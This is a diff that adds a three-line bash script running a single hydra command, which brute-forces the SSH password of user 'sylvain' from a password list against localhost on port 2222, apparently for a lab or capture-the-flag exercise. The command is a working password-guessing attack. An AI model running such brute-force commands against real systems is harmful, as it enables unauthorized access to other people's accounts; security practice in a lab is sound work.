@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+
+hydra -l sylvain -P pass_list -V 127.0.0.1 ssh -s 2222
